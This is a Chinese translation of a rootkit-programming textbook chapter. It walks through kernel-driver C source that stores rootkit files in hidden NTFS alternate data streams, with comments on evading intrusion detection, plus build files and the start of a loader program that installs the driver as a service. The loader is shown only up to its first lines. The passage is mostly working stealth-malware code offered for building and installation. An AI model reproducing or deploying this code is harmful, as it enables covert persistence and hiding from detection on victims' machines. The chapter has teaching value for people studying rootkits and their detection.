
# 交替数据流

交替数据流是一个过渡产品，那时微软仍然试图开发与 Macintosh 操作系统兼容的数据结构。Macintosh 系统有一种方法联系目标资源，例如图标（icon）文件，它并不会修改文件或改变文件大小。当微软为 Windows 操作系统增加这个功能时，他们就提供了一个很精彩的方法来隐藏文件。这个文件隐藏技术被广泛适用很长时间，以至于在一个被 `anti-rootkit` 监视的操作系统使用一个文件时会被发现，但是知道现在给目录增加一个交替数据流依然是相对安全的。

## 配置文件

配置文件如图 2-2 所示。

Figure 2-2

在阅读了这个配置文件之后，你会发现这个 `rootkit` 是作为一个交替数据流来存储的，与目录 `C:\WINDOWS\Resources` 相关联。这个文件目录在 `fileManager.h` 中被定义。使用硬编码路径是一个捷径。一个更强大的 `rootkit` 在分配一个隐藏文件位置前需要查询操作系统的 `%WINDOWS%` 目录。

## fileManager.h

`fileManager.h` 文件定义了交替数据流的位置为 `MASTER_FILE`，并且在 `configManager.c` 中声明了 `GetFile` 和 `PutFile` 函数：

```c
// Copyright Ric Vieler, 2006
// Support header for fileManager.c

#ifndef _FILE_MANAGER_H_
#define _FILE_MANAGER_H_

// Though no documentation mentions it, NTFS-ADS works with directories too!
// Each implementation should use a different known directory
// to avoid having the full pathname added to IDS's.
#define MASTER_FILE L"\\??\\C:\\WINDOWS\\Resources"

NTSTATUS GetFile( WCHAR* filename, CHAR* buffer, ULONG buffersize, PULONG
fileSizePtr );

NTSTATUS PutFile( WCHAR* filename, CHAR* buffer, ULONG buffersize );

#endif
```

## fileManager.c

`fileManager.c` 文件中只包含两个函数：`GetFile` 和 `PutFile`。你大概会注意到我们使用如此庞大的函数来实现如此简单的操作。欢迎来到核心编程。源文件如下：

```c
// fileManager
// Copyright Ric Vieler, 2006
// Use without path to get/put Alternate Data Streams from/to MASTER_FILE
// Use with full path to get/put regular files from/to the visible file system

#include "ntddk.h"
#include <stdio.h>
#include "fileManager.h"
#include "Ghost.h"

NTSTATUS GetFile( WCHAR* filename, CHAR* buffer, ULONG buffersize, PULONG
fileSizePtr )
{
 NTSTATUS rc;
 WCHAR ADSName[256];
 HANDLE hStream;
 OBJECT_ATTRIBUTES ObjectAttr;
 UNICODE_STRING FileName;
 IO_STATUS_BLOCK ioStatusBlock;
 CHAR string[256];

 // set file size
 *fileSizePtr = 0;

 // Get from NTFS-ADS if not full path
 if( wcschr( filename, '\\' ) == NULL )
  _snwprintf( ADSName, 255, L"%s:%s", MASTER_FILE, filename );
 else
  wcscpy( ADSName, filename );

 RtlInitUnicodeString( &FileName, ADSName );
 InitializeObjectAttributes( &ObjectAttr,
  &FileName,
  OBJ_CASE_INSENSITIVE,
  NULL,
  NULL);

 rc = ZwOpenFile(
  &hStream,
  SYNCHRONIZE | GENERIC_ALL,
  &ObjectAttr,
  &ioStatusBlock,
  FILE_SHARE_READ | FILE_SHARE_WRITE,
  FILE_SYNCHRONOUS_IO_NONALERT );

 if ( rc != STATUS_SUCCESS )
 {
  DbgPrint( "comint32: GetFile() ZwOpenFile() failed.\n" );
  _snprintf( string, 255, "comint32: rc = %0x, status = %0x\n",
   rc,
   ioStatusBlock.Status );
  DbgPrint( string );
  return( STATUS_UNSUCCESSFUL );
 }

 rc = ZwReadFile(
  hStream,
  NULL,
  NULL,
  NULL,
  &ioStatusBlock,
  buffer,
  buffersize,
  NULL,
  NULL );

 if ( rc != STATUS_SUCCESS )
 {
  DbgPrint( "comint32: GetFile() ZwReadFile() failed.\n" );
  _snprintf( string, 255, "comint32: rc = %0x, status = %0x\n",
   rc,
   ioStatusBlock.Status );
  DbgPrint( string );
  return( STATUS_UNSUCCESSFUL );
 }

 // Read was successful, return the number of bytes read
 *fileSizePtr = ioStatusBlock.Information;
 ZwClose( hStream );
 return( STATUS_SUCCESS );
}

NTSTATUS PutFile( WCHAR* filename, CHAR* buffer, ULONG buffersize )
{
 NTSTATUS rc;
 WCHAR ADSName[256];
 HANDLE hStream;
 OBJECT_ATTRIBUTES ObjectAttr;
 UNICODE_STRING FileName;
 IO_STATUS_BLOCK ioStatusBlock;
 CHAR string[256];

 // Put to NTFS-ADS if not full path
 if( wcschr( filename, '\\' ) == NULL )
  _snwprintf( ADSName, 255, L"%s:%s", MASTER_FILE, filename );
 else
  wcscpy( ADSName, filename );

 RtlInitUnicodeString( &FileName, ADSName );
 InitializeObjectAttributes( &ObjectAttr,
  &FileName,
  OBJ_CASE_INSENSITIVE,
  NULL,
  NULL);

 rc = ZwCreateFile(
  &hStream,
  SYNCHRONIZE | GENERIC_ALL,
  &ObjectAttr,
  &ioStatusBlock,
  NULL,
  FILE_ATTRIBUTE_NORMAL,
  FILE_SHARE_READ | FILE_SHARE_WRITE,
  FILE_OVERWRITE_IF,
  FILE_SYNCHRONOUS_IO_NONALERT,
  NULL,
  0);

 if ( rc != STATUS_SUCCESS )
 {
  DbgPrint( "comint32: PutFile() ZwCreateFile() failed.\n" );
  _snprintf( string, 255, "comint32: rc = %0x, status = %0x\n", rc,
ioStatusBlock.Status );
  DbgPrint( string );
  return( STATUS_UNSUCCESSFUL );
 }

 rc = ZwWriteFile(
  hStream,
  NULL,
  NULL,
  NULL,
  &ioStatusBlock,
  buffer,
  buffersize,
  NULL,
  NULL );

 if ( rc != STATUS_SUCCESS )
 {
  DbgPrint( "comint32: PutFile() ZwWriteFile() failed.\n" );
  _snprintf( string, 255, "comint32: rc = %0x, status = %0x\n", rc,
ioStatusBlock.Status );
  DbgPrint( string );
  ZwClose( hStream );
  return( STATUS_UNSUCCESSFUL );
 }

 ZwClose( hStream );
 return( STATUS_SUCCESS );
}
```

首先值得注意的是上述函数和使用宽位字符串的标准用户函数之间的区别。所有新的微软操作系统都使用宽位字符，因此如果你想与操作系统对接，作为与用户函数的对照，你需要习惯这种约定。

下一个我们关心的项目是 `RtlInitUnicodeString`。如果你有 `MSDN`，你也许会找到关于 `RtlInitUnicodeString` 的定义，不过会发选出现的问题远远多于答案，例如这样的其他问题--什么是无页缓冲区？和我如何知道我的 `IRQL` 是否少于或等于 `DISPATCH_LEVEL`？现在，只要将这个 `Unicode` 串考虑成一个在使用前需要声名和初始化的参数就可以了。在这个例子中，`Unicode` 串 `FileName` 与 `ObjectAttr` 相关联并传递给 `ZwOpenFile`。

`ZwOpenFile` 是一个的内核状态量， `OpenFile` 是一个用户状态 `platform` 软件开发包中的函数。如果你依然没有猜到，这个 `rootkit` 内核状态下的驱动程序，是包括所有的内核模式下编程的特权和复杂性。文件函数以 `Zw` 开头，`I/O` 函数以 `Io` 开头，同步函数以 `Ke` 开头，资源函数以 `Ex` 开头，映射函数以 `Mm` 开头，字符串函数以 `Rtl` 开头。这些函数不会像你以前使用标准用户函数那样简单，但是你可以逐步进入内核模式编程。

`GetFile` 主要由三个函数组成：`ZwOpenFile`, `ZwReadFile`, 和 `ZwClose`。`PutFile` 主要由 `ZwCreateFile`, `ZwWriteFile`, 和 `ZwClose` 组成。唯一值得注意的变化是 The only notable change is that the filename is appended to the directory name with a colon separator. 这就是 `ADS` 的语法。你可以在 `DOS` 命令提示符下自行测试。创建一个只有一行文本的文件，命令为 `test.txt` 并保存，注意它的文件大小。选择使用命令“`echo xxx > test.txt:alternate.txt`”向 `test.txt` 中添加交替数据流。现在你可以使用命令“`notepad test.txt:alternate.txt`”来查看这个交替数据流的内容 `XXX`，但是目录列表中只显示 `test.txt`，并且文件的大小并没有包含刚才增加的交替数据流。

下面写出这个例子源代码，但是还需要两个文件。每个驱动开发包编译驱动程序都需要一个 `SOURCES` 文件和一个 `MAKEFILE` 文件。这些文件是开发工具所需要的用来确定怎样去编译一个驱动程序的，它通常包括被编译产品的名称和编译所需的文件列表。像我们前面说的，目标文件的名称是 `comint32` 相关文件就是前面详细描述过的。因此我们在这本书中将增加 `SOURCES` 文件，`MAKEFILE` 文件将保持不变。

## SOURCES 文件

下面是 `SOURCES` 文件的内容：

```
TARGETNAME=comint32
TARGETPATH=OBJ
TARGETTYPE=DRIVER
SOURCES=Ghost.c\
 fileManager.c\
 configManager.c
```

## MAKEFILE 文件

下面是 `MAKEFILE` 文件的内容：

```
#
# DO NOT EDIT THIS FILE!!!  Edit .\sources. if you want to add a new source
# file to this component.  This file merely indirects to the real make file
# that is shared by all the driver components of the Windows NT DDK
#
!INCLUDE $(NTMAKEENV)\makefile.def
```

如果你没有跟随我们一起，还有什么不清楚的地方，那么不要紧。现在也可以来编译这个例子。只要双击你桌面上的“Checked DDK”图标，定位你源文件的目录，并输入指令：`build`。驱动程序开发包将完成其他任务。

然后，你可以得到一个名为 `commint32.sys` 的新文件。这个就是你的 `rootkit`，如果你喜欢也可以说是你的驱动程序。现在你所需要的就是一个安装它的方法，其实这样的方法有很多。

如果你没有跟随我们一起编译，你可以在源代码包里获得同样版本的 `comint32.sys`。你也可以在源代码包里找到加载和卸载程序 `SCMLoader.exe` 和 `SCMUnloader.exe`。

# 安装你的 Rootkit

一般用户级应用程序的加载和执行是同步的，与此不同的是，驱动程序的加载和开始运行是两个独立的步骤。这种两步法允许允许操作系统在早期开机启动进程加载一些驱动然后晚些时候再开始运行。它也允许加载进程附加一条注册条目，使驱动程序在重启时重新加载。

虽然大多数 `rootkits` 被设计成伴随启动进程加载并永不卸载，我们可以使用“请求启动”来加载，它允许在任何时候加载或卸载 `rootkits`。这是开发驱动程序中一个普遍使用的方法，允许开发者在不需要重新启动主机的情况下重复的停止、卸载、重建、重加载或重启动驱动程序。

简单来说，用一个小的可执行文件来安装这个 `rootkit`。所有的程序需要做的是打开服务控制管理器并加载一个内核设备驱动。

加载和卸载一个设备驱动程序如图 2-3 所示。

Figure 2-3

## SCMLoader.c

代码如下：

```c
// Copyright Ric Vieler, 2006
// This program will load c:\comint32.sys
#include <windows.h>
#include <stdio.h>
#include <process.h>

void main( int argc, char *argv[ ] )
{
 SC_HANDLE sh1;
 SC_HANDLE sh2;
 sh1 = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
 if ( !sh1 )
 {
  printf( "OpenSCManager Failed!\n" );
  return;
 }
```
